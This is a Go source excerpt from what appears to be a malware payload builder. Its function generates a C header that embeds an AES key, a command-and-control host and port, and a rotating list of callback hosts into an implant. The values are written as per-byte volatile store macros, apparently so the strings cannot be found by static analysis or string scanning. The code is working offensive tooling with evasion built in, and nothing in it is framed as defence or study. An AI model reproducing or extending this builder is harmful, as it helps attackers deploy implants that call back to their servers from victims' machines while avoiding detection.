// generateNaxConfigH produces nax_config.h with volatile per-byte write macros
// for the AES key, C2 host and C2 port
func generateNaxConfigH(aesKeyHex, c2Host string, c2Port int, extraHosts []string) ([]byte, error) {
	key, err := hex.DecodeString(aesKeyHex)
	if err != nil || len(key) != 16 {
		return nil, fmt.Errorf("nax_config.h: invalid AES key %q", aesKeyHex)
	}

	var buf bytes.Buffer
	buf.WriteString("/* nax_config.h — generated by BuildPayload. DO NOT EDIT. */\n")
	buf.WriteString("#pragma once\n\n")

	buf.WriteString("/* AES-128 key — per-byte volatile stores */\n")
	writeNaxBytesWriteMacro(&buf, "NAX_AES_KEY_WRITE", key)
	buf.WriteString("\n")

	buf.WriteString("/* C2 host — per-char volatile stores */\n")
	fmt.Fprintf(&buf, "#define NAX_C2_HOST_LEN %du\n", len(c2Host))
	writeNaxCharWriteMacro(&buf, "NAX_C2_HOST_WRITE", c2Host)
	buf.WriteString("\n")

	portLo := byte(c2Port & 0xFF)
	portHi := byte((c2Port >> 8) & 0xFF)
	buf.WriteString("/* C2 port — 2-byte volatile stores */\n")
	fmt.Fprintf(&buf,
		"#define NAX_C2_PORT_WRITE( p ) do { "+
			"volatile uint8_t *_pp = (volatile uint8_t*)(p); "+
			"_pp[0]=0x%02X; _pp[1]=0x%02X; "+
			"} while(0)\n",
		portLo, portHi)

	// Extra callback hosts — for pre-profile host rotation
	// Each entry is "host:port"; inject as NAX_CB_HOST_N_WRITE / NAX_CB_PORT_N
	allHosts := []string{fmt.Sprintf("%s:%d", c2Host, c2Port)}
	for _, h := range extraHosts {
		if h != "" && h != fmt.Sprintf("%s:%d", c2Host, c2Port) {
			allHosts = append(allHosts, h)
		}
	}
	if len(allHosts) > 8 { allHosts = allHosts[:8] }
	fmt.Fprintf(&buf, "\n/* Callback hosts for pre-profile rotation (%d entries) */\n", len(allHosts))
	fmt.Fprintf(&buf, "#define NAX_CB_HOST_COUNT %du\n", len(allHosts))
	for i, entry := range allHosts {
		host := entry
		portN := c2Port
		if idx := len(entry)-1; idx > 0 {
			for j := idx; j >= 0; j-- {
				if entry[j] == ':' {
					host = entry[:j]
					fmt.Sscanf(entry[j+1:], "%d", &portN)
					break
				}
			}
		}
		pLo := byte(portN & 0xFF)
		pHi := byte((portN >> 8) & 0xFF)
		fmt.Fprintf(&buf, "#define NAX_CB_HOST_%d_LEN %du\n", i, len(host))
		writeNaxCharWriteMacro(&buf, fmt.Sprintf("NAX_CB_HOST_%d_WRITE", i), host)
		fmt.Fprintf(&buf, "#define NAX_CB_PORT_%d_WRITE( p ) do { volatile uint8_t *_pp=(volatile uint8_t*)(p); _pp[0]=0x%02X; _pp[1]=0x%02X; } while(0)\n", i, pLo, pHi)
	}

	return buf.Bytes(), nil
}

func writeNaxBytesWriteMacro(buf *bytes.Buffer, name string, data []byte) {
	fmt.Fprintf(buf, "#define %s( p ) do { \\\n", name)
	for i, b := range data {
		if i%8 == 0 {
			buf.WriteString("    ")
		}
		fmt.Fprintf(buf, "(p)[%2d]=0x%02X; ", i, b)
		if i%8 == 7 {
			buf.WriteString("\\\n")
		}
	}
	if len(data)%8 != 0 {
		buf.WriteString("\\\n")
	}
	buf.WriteString("} while(0)\n")
}

func writeNaxCharWriteMacro(buf *bytes.Buffer, name string, s string) {
	fmt.Fprintf(buf, "#define %s( p ) do { \\\n", name)
	for i, c := range s {
		if i%8 == 0 {
			buf.WriteString("    ")
		}
		fmt.Fprintf(buf, "(p)[%2d]='%c'; ", i, c)
		if i%8 == 7 {
			buf.WriteString("\\\n")
		}
	}
	if len(s)%8 != 0 {
		buf.WriteString("\\\n")
	}
	fmt.Fprintf(buf, "    (p)[%2d]='\\0'; \\\n", len(s))
	buf.WriteString("} while(0)\n")
}

